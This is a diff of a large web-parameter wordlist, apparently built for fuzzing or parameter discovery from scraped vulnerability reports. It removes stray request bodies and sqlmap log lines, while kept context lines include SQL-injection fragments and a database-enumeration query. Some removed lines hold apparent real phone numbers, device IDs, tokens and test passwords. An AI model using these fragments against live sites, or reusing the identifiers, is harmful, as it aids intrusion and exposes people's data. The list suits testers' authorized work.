 select TABLE_NAME,NUM_ROWS from tabs
-{'keyWords':'10000'}
 DealCode
 districtID
 jsonForm
@@ -22365,7 +22043,6 @@ TIMEEND
 SHOWRECORDS
 SESSION_ID
 TIMESTART
-{"sign_method":"sha1","timestamp":1440039648,"package":"bank_type
 spbill_create_ip
 spage
 ordertpye
@@ -22432,7 +22109,6 @@ selHotelID
 ctl00%24cphMain%24ddlIdType
 ctl00%24cphMain%24txtIdNo
 accId
-1.6. http://pr-ai.hit.edu.cn/mpic/reg_chk.php [passwd parameter]
 ACTIVATION_DATE
 displayType
 ssp
@@ -22512,7 +22188,6 @@ hidsDeptvalues
 account[0]
 account[1]
 lev1
-{"UserType":"ZY","MobilePhone":"15910773439","NewPassword":"k5/Qfh/Z+Uy2M3vP6dDTHg
 F_sub.y
 F_sub.x
 [*] shutting down at 01:04:39
@@ -22632,7 +22307,6 @@ four
 page.curPageNo
 moble
 mobyzm
-{"USER":"","REQUESTTYPE":"KXBJRT0005","PARAMETERS":{"UserName":"13888888888","Contacts":"mobile"}}
 loginpswd
 [*] shutting down at 22:20:44
 bt_query
@@ -23034,7 +22708,6 @@ PAGE_RECORDCOUNT_KEY
 PAGE_COUNT_KEY
 findType
 in_reply_to_status_id
-{"deviceID":"|020000000000|iPhone 4|Apple|7.1.2|WiFi|322DE878-2D0E-436D-B94C-CAF297A65398","password":"§123123§","loginName":"§Aaaaa§","terminalType":2,"useVersion":"5.1.0","osVersion":"iPhone 4"}
 branchCompany
 pilot
 busId
@@ -23063,7 +22736,6 @@ t_password
 t_username
 or
 ratemax
-{"areaName":"\u00e9\u00a6\u0099\u00e6\u00b4\u00b2"}
 chk1
 hidmaterid
 txtjiaocainame
@@ -23099,12 +22771,10 @@ auto_login
 hash_code
 [*] shutting down at 17:12:47
 wx_qr_code_id
-{"PersonAccount":"-1 "}
 maxLimit
 minLimit
 isContent
 tradeid
-http_request_count
 PSSL
 PSSJ
 formaction
@@ -23125,7 +22795,6 @@ med_fil
 recommend%5b%5d
 LoginForced
 RememberLoginPassword
-{"UserName":"admin"}
 TrCode
 Parent
 SearchButton
@@ -23175,7 +22844,6 @@ ticketId2
 priceSign26175
 ticketName26175
 ticketCount
-{"cmd":60006,"request":{"did":"a1a0Ln6L","channel":"1111"}}
 areaName
 provID
 rands
@@ -23199,10 +22867,6 @@ errorpage
 getpage
 %3Asessionid
 obj-action
-{"desCustomerId":"360000000064845496","pageNum":1,"pageSize":10,"channel":"","clientVersion":"","customerId":"360000000051318036","macAddress":"","auth":"","userId":"1000000003607","clientName":"","deviceId":"","version":""}
-{"desCustomerName":"u7RNVmqGzNrHVgn/vI/UpQ\u003d\u003d","channel":"","clientVersion":"","customerId":"360000000253312977","macAddress":"","auth":"f15d43c3986293cfc3885121ad2204e3","userId":"1200010338038","clientName":"","deviceId":"","version":""}
-{"desCustomerId":"360000000041109552","pageNum":1,"pageSize":10,"channel":"xiaomi","clientVersion":"4.1.0","customerId":"360000000215219468","macAddress":"14-f6-5a-d1-47-0f","auth":"f9957871d0a24d108e62015942f4d5b5","userId":"1200006529071","clientName":"android","deviceId":"866001023475214","version":"2.0"}
-{"desCustomerId":"360000000041109552","pageNum":1,"pageSize":10,"channel":"","clientVersion":"","customerId":"360000000215219468","macAddress":"","auth":"","userId":"1200006529071","clientName":"","deviceId":"","version":""}
 btnSeach
 GridViewer1%24ctl13%24NumGoto
 expired
@@ -23222,7 +22886,6 @@ agree.agrContent
 compile
 label_id
 industry_id
-{"itemId":null,"adObjectId":"5a5f17c0-e3f6-41f6-86ef-5ae56f55b386","emailAddress":{"__type":"EmailAddress:#Exchange","EmailAddress":"<a href
 turnPageBeginPos
 wxCode
 srcChannel
@@ -23347,15 +23010,12 @@ isremote
 inputclassid
 powergroup
 ifcookie
-[{"userId":"admin","password":"123456"}]
 or '
 frist2
 second2
 transport_type[]
 frist1
 second1
-{"ProvinceCode":"001001","Mobile":"13800138000","Paid":"0","DeliveryType":"001","CountryCode":"001","InvoiceType":"1","InvoiceCaption":"%E6%B2%A1%E6%9C%89%E5%A4%87%E6%B3%A8","PayType":"04","NeedProductList":"1","usersession":"u03oobrjcd0sfcgzpuzebzxv
-13xxxxxxx3","DeliveryPrice":"0","TelePhone":"","Note":"%E6%B2%A1%E6%9C%89%E7%95%99%E8%A8%80","TotalPrice":"362","RegionCode":"001001001001","Address":"%E5%8C%97%E4%BA%AC%E5%8C%97%E4%BA%AC%E5%B8%82%E8%BE%96%E5%8C%BA%E4%B8%9C%E5%9F%8E%E5%8C%BA","NeedInvoice":"1","CustomerID":"13xxxxxxx3","InvoiceContent":"111","AgentCode":"iOS","DeliveryTypeName":"%E6%97%B6%E9%97%B4%E4%B8%8D%E9%99%90","ZipCode":"010000","DiscountPrice":"0","Method":"Sub_NewOrder","OrderDetailList":[{"IsGift":false,"VIPPRICE":362,"ProductCode":"rg001870","IsCharge":"1","Note":"","UnitPrice":362,"PromotionCode":"","SuitCode":false,"ProductName":"%E6%BE%B3%E5%A4%A7%E5%88%A9%E4%BA%9A%E7%BB%B4%E5%A4%9A%E5%88%A9%E4%BA%9A%E4%BA%9A%E6%8B%89%E6%B2%B3%E8%B0%B7%E4%BC%98%E4%BC%B6%E9%85%92%E5%BA%84%E7%89%B9%E5%B9%B2%E9%BB%91%E6%AF%94%E8%AF%BA2010%E6%A1%83%E7%BA%A2%E8%91%A1%E8%90%84%E9%85%92","TotalPrice":362,"DiscountPrice":0,"Count":1}],"CityCode":"001001001","ProductPrice":"362","CustomerName":"%E9%A6%92%E5%A4%B4%E5%93%A5","DeliveryTimeType":"1228456846128","PayTypeName":"%E6%94%AF%E4%BB%98%E5%AE%9D"}
 ctl00%24ContentPlaceHolder1%24repeaterModelList%24ctl01%24ModelRating_RatingExtender_ClientState
 ctl00%24ContentPlaceHolder1%24repeaterModelList%24ctl00%24ModelRating_RatingExtender_ClientState
 ctl00%24ContentPlaceHolder1%24ddListModelCategory
@@ -23388,7 +23048,6 @@ prepage
 cur_sel
 orderName
 ActivityName
-{"contentcode":"","sitecode":"*"}
 %2BvhBwLs0Yq1BQLs0fbZDAKM54rGBgK7q7GGCIumxlCEdDS6QmM2SO3K2e2LX2J%2B
 UsbKey
 ServerAddress
@@ -23419,8 +23078,6 @@ umpassword
 ImageButtonLogOn.x
 ImageButtonLogOn.y
 HiddenIP
-{"conKey":"内容质量差","userEmail":"<a href
-{"pageNo":"1","pageSize":"10","userId":"<a href
 mapNames
 [01:48:32] [INFO] retrieved: e
 KC_USE
@@ -23450,7 +23107,6 @@ is_fufei
 adress
 pkTicketOrderId
 epaper_order
-{"username":"monica","responseDataType":"JSON","password":"123456"}
 authstr
 memberinfo%5bamount%5d
 memberinfo[modelid]
@@ -23535,8 +23191,6 @@ loginSubmitIpt
 userBean.password
 userBean.name
 signin
-{"request":{"header":{"reqTime":"2013-11-30 20:37:53.044","accountID":"5ee7b429-bxx6-4xxf-8xx7-3c384c4xx68a","version":"20110303090115","serviceName":"MaintainUserToken","digitalSign":"1B6766A0A126ssssssss1682138"},"body":{"refId":"5866741","DeviceName":"iPhone 5","projectID":"1001","AppVersion":"5.3.0","DeviceVersion":"7.0.4","memberId":"1590xxxxx","clientInfo":{"clientIp":"10.x.x.x","refId":"5866741","versionType":"iPhone","versionNumber":"5.3.0","deviceId":"DC4D7994-3xx0-4xxB-Axx3-D7E9D9xxA40C"},"deviceId":"DC4D7994-3xx0-4xxB-Axx3-D7E9D93CA40C"}}}
-{"accountType":"1","account":"6226xxxxxxxxxxxx","passwordVerify":"0","encryptPassword":"","sonEncryptAccount":"0001","extend.channel_btt":"1","TransId":"cmbc.moreAccount"}
 noticeBean.title
 noticeBean.endDate
 noticeBean.sourceCH
@@ -23613,7 +23267,6 @@ selectAgree
 manufacturer.phone
 manufacturer.province.provinceCode
 validationCode
-{"ringID":"9000720120615178827", "caller":""}
 re_passwd
 weibo_url
 pagegoto
@@ -23624,98 +23277,6 @@ txtUsers
 t_pwd1
 t_pwd2
 t_pwd
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl10%24HFForActEndTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl09%24HFForSchYear
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl02%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl10%24HFForUnt_Type
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl11%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl09%24HFForUnt_Type
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl03%24HFForSchYear
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl10%24HFForSchYear
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl06%24HFForSchYear
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl08%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl02%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl06%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl08%24HFForUnt_Type
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl11%24HFForActEndTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl08%24HFForActEndTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl06%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl11%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl04%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl06%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl08%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl04%24HFForUnt_Type
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl05%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl02%24HFForActEndTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl04%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl07%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24DDLForGovOrTeach
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl02%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl05%24HFForUnt_Type
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl09%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24BtnForSearch
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl08%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl11%24HFForUnt_Type
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl06%24HFForSchSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl10%24HFForSchSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl05%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl03%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl03%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl03%24HFForSchSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl05%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl09%24HFForActEndTime
-ctl00%24LoginFormBox1%24TbLoginPW
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl04%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl06%24HFForUnt_Type
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl04%24HFForSchSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl09%24HFForSchSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl03%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl08%24HFForSchYear
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl03%24HFForUnt_Type
-ContentPlaceHolder1_ToolkitScriptManager1_HiddenField
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl11%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl07%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl09%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl09%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl04%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl10%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl08%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl07%24HFForUnt_Type
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24DDLForSchYearSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl03%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl10%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24DateTimeBoxForStart%24DateFieldBox
-ctl00%24LoginFormBox1%24TbLoginId
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl02%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl09%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl11%24HFForSchSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl06%24HFForActEndTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl05%24HFForActEndTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl07%24HFForBs_No
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl02%24HFForSchSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl10%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl07%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl04%24HFForActEndTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl02%24HFForUnt_Type
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl03%24HFForActEndTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl08%24HFForSchSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl07%24HFForSchYear
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl05%24HFForSchSem
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl07%24HFForActEndTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl10%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24DateTimeBoxForEnd%24DateFieldBox
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl02%24HFForSchYear
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl05%24HFForSchYear
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl07%24HFForSchSem
-ContentPlaceHolder1_TabContainer1_ClientState
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24TextBoxForKeyword
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl06%24HFForActStartTime
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl05%24HFForUnt_Name_Abr
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl04%24HFForSchYear
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl11%24HFForupUnitName
-ctl00%24ContentPlaceHolder1%24TabContainer1%24TabPanelBsSearch%24gvForBsActiveSearch%24ctl11%24HFForSchYear
-session::set('e_mail',$user['e_mail']);
-[11:02:53] [INFO] retrieved: newbao
 ctl00%24cph_body%24Zhmm1%24fm_xm
 ctl00%24cph_body%24Zhmm1%24ibtnOK.y
 ctl00%24cph_body%24Zhmm1%24fm_username
@@ -23804,13 +23365,9 @@ txtXmmc
 txtXmh
 DB Name: ORCHIS
 参数chrMemo%5b%5d 和 tld%5b%5d存在注入
-{"Code":"§1111§","Phone":"15******99","Password":"wooyun123"}
-{"jobNum":"10000334","keyword":"","offset":0,"limit":10}
-{"success":true,"emsg":""}
 xxxxxx8
 IbtnLogin.x
 IbtnLogin.y
-{"token":"","telephone":"","password":"123","captchaimage":"","oem":"NULL","osversion":"1.1.0","screenwidth":1366,"screenheight":650,"apptype":"1","appversion":"1.0.0","nettype":"unknown","regcode":"250","provcode":"264","partner":"babytree"}
 Ctr_EndTime
 %2FWieTprTBw%3D%3D
 Ctr_BeginTime
@@ -23854,7 +23411,6 @@ PageSizeIndex
 AddressCity
 AddressDistrict
 AddressProvince
-{"login_name":"13333333333","password":"123123qq"}
 carids
 ReqMessageHead
 ReqMessageBody
@@ -23924,7 +23480,6 @@ customercode
 verifypass
 newpassword1
 newpassword2
-{"action":"retrivepassword","UserName":"test3","Email":"<a href
 mdate
 school_loc
 im.x
@@ -24119,7 +23674,6 @@ TabContainer1%24TabPanel1%24btQueryPerson
 DictionaryID
 tb_Exml
 tb_UserCode
-{"map":{"method":"setPimViewed","params":{"javaClass":"java.util.ArrayList","list":["16600","201309024315_S1414466619752.jpg"]}},"javaClass":"java.util.HashMap"}
 CHANNELID
 LOGINPASSWORD
 BTMAC
@@ -24142,7 +23696,6 @@ searchareaid
 searchjobstr
 venderId
 signmethod
-{"hotelStaff":{"staffName":"çå¸","staffNameEn":"wangshuai9","passWord":"qwer1234","sex":"ç·","email":"","hotelId":"60201251","staffLevel":"1","hotelDept":"0","mobile":"131234xxxxx","singleHotelSign":1,"operator":"çå¸"},"hotelUser":{"operator":"çå¸","ebookingModels":"35,101,102,34,26,27,10,47,39,40,2,4,8,5,1,"}}
 |          |                 | 1      |
 file_source
 Comment
@@ -24177,7 +23730,6 @@ form1%3Apassword
 form1%3AloginName
 device_model
 pkgId
-{"length":"20","start":"0"}
 platform_model
 BackBtn
 SaveBtn
@@ -24192,7 +23744,6 @@ xmname
 SourceTypeSysNo
 iptIds
 gvList%24ctl18%24txtNewPageIndex
-{"version":"2.0","userID":"1209531862","ra":1,"tvid":"449747800","pform":6,"play_process":{"file_type":"F4V","hcdn_code":"13","step":3,"access_vrs":{"url":"http://cache.video.qiyi.com/vps?tvid
 MinChg
 PCIDStr
 SeaButton
@@ -24277,7 +23828,6 @@ UUM_COMPANYCODE
 UM_SYSTEM
 countR
 countH
-{"security":{"id":"1010014296","appversion":"2.4.5","session":"12490440131442817489779","devicemodel":"iPhone","appkey":"CFITC","sysversion":"8.4","udid":"1626E17B-A81B-4191-A102-FC1112F948AC"},"head":{"method":"contractList","action":"ContractAction","state":"new"},"info":{"CustNo":"1010014295"}}
 btnLog
 pmd5
 isLowerCase
@@ -24345,7 +23895,6 @@ mcuser.orgcode
 mcuser.username
 mcuser.backup1
 mcuser.backup2
-{
 usertypes
 userguid
 F_MM
@@ -24362,7 +23911,6 @@ band_width
 image_name
 net_lanch
 kaoqu
-{"deviceId":"4DF48D0A-FE66-4489-AA87-AD9B0CEB4CF6","sessionToken":"","appVersionCode":392,"apiCode":"607","systemName":1,"band":"iPhone 6","orderId":21509,"secretKey":"6d41ddef77caa92af90e15e18736ea38","appId":1,"systemVersion":"9.1","timestamp":1448254207377}
 textfield_b_15
 %C4%D0
 excellence
@@ -24401,7 +23949,6 @@ pswd
 appschoolid
 textName
 textXlh
-{"validateMessagesShowId":"_validatorMessage","status":true,"httpstatus":200,"data":{"loginCheck":"Y"},"messages":[],"validateMessages":{}}
 daynum
 reqwyear
 rdoJobCcType
@@ -24418,7 +23965,6 @@ exchangecode
 believeFlag
 givingFlag
 givingTel
-{"changeType":"1","cardType1":"1","cardType2":"1","cardNo1":"613012100048"}
 MSM_HEADER
 MSM_PARAM
 dbTable
@@ -24435,7 +23981,6 @@ imgbutSearch.x
 imgbutSearch.y
 RBUTzzlb
 voteUrl
-url	http://www.xiami.com/song/1769227691
 is_suggestion
 limit_offset
 limit_count
@@ -24475,7 +24020,6 @@ newpws
 E_mail
 qop
 delegatebillid
-[{"updatetime":"2016-01-21 00:00:00","bookid":"166465"}]
 hfMaxPrice
 PorName
 CityRegion
@@ -24582,7 +24126,6 @@ memberCardNo
 passwordOne
 loginTypeSel
 savepwd
-{"data":[],"userid":"itwgiv","vs":"and412","combineTime":"0","imei":""}
 IbtnEnter
 rem_account
 login_platform
@@ -25192,7 +24735,6 @@ ht
 htbin
 htdocs
 HTML
-http
 hu
 humor
 hyperstat
@@ -27050,7 +26592,6 @@ github
 filesystem
 pastefromword
 templats
-httpfoundation
 chart
 webuploader
 versions
@@ -27060,7 +26601,6 @@ dataflow
 wsc
 productalert
 tutucms
-httpkernel
 onepage
 vimp
 phpdocumentor
@@ -27511,7 +27051,6 @@ sass
 felogin
 symbols
 youtube
-guzzlehttp
 advlist
 compat
 esmtp
@@ -28279,7 +27818,6 @@ mr
 tstemplate
 pink
 nominal
-httpcache
 wideimage
 declaration
 aliyunemail
@@ -28950,7 +28488,6 @@ mana
 listblock
 socialite
 maximize
-httpclient
 abandoned
 apistore
 embedvideo
@@ -29801,7 +29338,6 @@ yancreate
 dflydev
 blockelements
 reverse
-httpauth
 mathjax
 assignment
 pdosqlsrv
@@ -30596,7 +30132,6 @@ xiuxiu
 assigned
 rgtabs
 rotate
-httpsession
 dbmanage
 customizations
 personcenter
@@ -30833,7 +30368,6 @@ usedd
 codesample
 insertphoto
 enc
-httprequest
 recursion
 wafregional
 lobibox
@@ -31944,7 +31478,6 @@ timing
 moneycardprocessor
 titlepic
 chkupdate
-xmlhttp
 provision
 halo
 gravatar
@@ -33141,7 +32674,6 @@ ocean
 mother
 swekey
 buildermodel
-httpfile
 elm
 jqueryfileupload
 firewallentrypoint
@@ -35348,7 +34880,6 @@ html-upload
 browser-uploader
 noapi
 backto
-wp_http_referer
 new_role2
 new_role
 delete_option
@@ -35511,7 +35042,6 @@ background-size
 background-repeat
 background-attachment
 background-color
-_wp_original_http_referer
 _jsonp
 replytocom
 preview_id
@@ -35964,7 +35494,6 @@ web_mailopen
 web_jtopen
 web_zsyopen
 web_duo
-web_https
 tag_indexmetatit
 tag_indexkey
 tag_indexdes
@@ -36076,10 +35605,6 @@ hits_month
 _scid
 _tags
 nofilter
-pic_http
-bpic_http
-mpic_http
-spic_http
 tag_status
 ischapter
 _data_id
@@ -41029,7 +40554,6 @@ disablechecksumoffloading
 disableconsolemenu
 disabledBBC
 disablefilter
-disablehttpredirect
 disablelargereceiveoffloading
 disablelocallogging
 disable_magic_url
@@ -44549,10 +44073,6 @@ htp
 htq
 htr
 hts
-httpbanner
-httpscanner
-httpsname
-httpsverify
 htu
 htv
 htw
@@ -47614,7 +47134,6 @@ login_status
 login_title
 login_user_id
 loglevel
-loglighttpd
 logMeIn
 logopng
 logo_url
@@ -49322,8 +48841,6 @@ nog
 nogrants
 noh
 nohtml
-nohttpreferercheck
-nohttpsforwards
 noi
 nok
 nol
